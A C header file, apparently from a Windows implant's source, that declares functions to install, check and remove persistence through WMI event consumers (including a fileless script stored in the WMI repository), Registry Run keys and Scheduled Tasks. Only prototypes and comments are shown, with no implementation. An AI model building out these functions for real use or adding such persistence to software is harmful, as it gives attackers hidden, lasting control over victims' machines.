#pragma once
#include <windows.h>

// -----------------------------------------------------------------------
// WMI CommandLineEventConsumer — runs implant binary directly on trigger
// -----------------------------------------------------------------------
BOOL InstallWmiPersistence(const wchar_t* implantPath);

// -----------------------------------------------------------------------
// WMI ActiveScriptEventConsumer — script stored in WMI repo, no file
// Call AFTER InstallWmiPersistence (shares the same __EventFilter)
// -----------------------------------------------------------------------
BOOL InstallWmiScriptPersistence(const wchar_t* implantPath);

// -----------------------------------------------------------------------
// Registry Run key — HKCU always, HKLM if elevated (no elevation req.)
// -----------------------------------------------------------------------
BOOL InstallRegistryPersistence(const wchar_t* implantPath);

// -----------------------------------------------------------------------
// Scheduled Task — runs implant binary on trigger
// -----------------------------------------------------------------------
BOOL InstallScheduledTaskPersistence(const wchar_t* implantPath);

// -----------------------------------------------------------------------
// Query: is the WMI CommandLineEventConsumer present?
// -----------------------------------------------------------------------
BOOL IsWmiPersistenceInstalled();

// -----------------------------------------------------------------------
// Query: is the scheduled task installed?
// -----------------------------------------------------------------------
BOOL IsScheduledTaskInstalled();

// -----------------------------------------------------------------------
// Remove: delete the scheduled task
// -----------------------------------------------------------------------
BOOL RemoveScheduledTaskPersistence();

// -----------------------------------------------------------------------
// Remove all three WMI objects (binding → consumer → filter)
// -----------------------------------------------------------------------
BOOL RemoveWmiPersistence();